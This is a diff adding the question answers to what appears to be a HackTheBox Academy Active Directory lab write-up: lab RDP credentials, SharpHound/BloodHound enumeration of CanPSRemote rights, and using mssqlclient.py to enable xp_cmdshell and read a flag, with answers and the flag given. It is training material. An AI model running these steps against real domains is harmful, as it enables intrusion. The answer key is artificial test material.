@@ -377,3 +377,61 @@ Finally, whenever we find SQL credentials (in a script, a web.config file, or an
 
 The following section will address a common issue we often run into when using WinRM to connect to hosts in the network.
 
+## **Questions**
+
+### What other user in the domain has CanPSRemote rights to a host?
+
+```bash
+xfreerdp /v:10.129.228.68 /u:htb-student /p:'Academy_student_AD!' /cert-ignore /dynamic-resolution
+```
+
+now go to powershell
+
+```powershell
+cd C:\Tools
+Import-Module ActiveDirectory
+Get-Module
+.\SharpHound.exe -c All --zipfilename ILFREIGHT
+cd C:\Tools\BloodHound-GUI
+.\BloodHound.exe
+#upload ILFREIGHT zip file in bloodhound
+```
+
+now add this RAW query
+
+```
+MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
+```
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+bdavis
+
+### What host can this user access via WinRM? (just the computer name)
+
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+ACADEMY-EA-DC01
+
+### Leverage SQLAdmin rights to authenticate to the ACADEMY-EA-DB01 host (172.16.5.150). Submit the contents of the flag at C:\Users\damundsen\Desktop\flag.txt
+
+```bash
+xfreerdp /v:10.129.230.228 /u:damundsen /p:'SQL1234!' /cert-ignore
+```
+
+go to admin powershell then ssh into linux box
+
+```powershell
+ssh htb-student@172.16.5.225  #HTB_@cademy_stdnt!
+mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth #SQL1234!
+```
+
+now inside SQL
+
+```sql
+enable_xp_cmdshell
+xp_cmdshell type C:\Users\damundsen\Desktop\flag.txt
+#1m_the_sQl_@dm1n_n0w!
+```
+
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
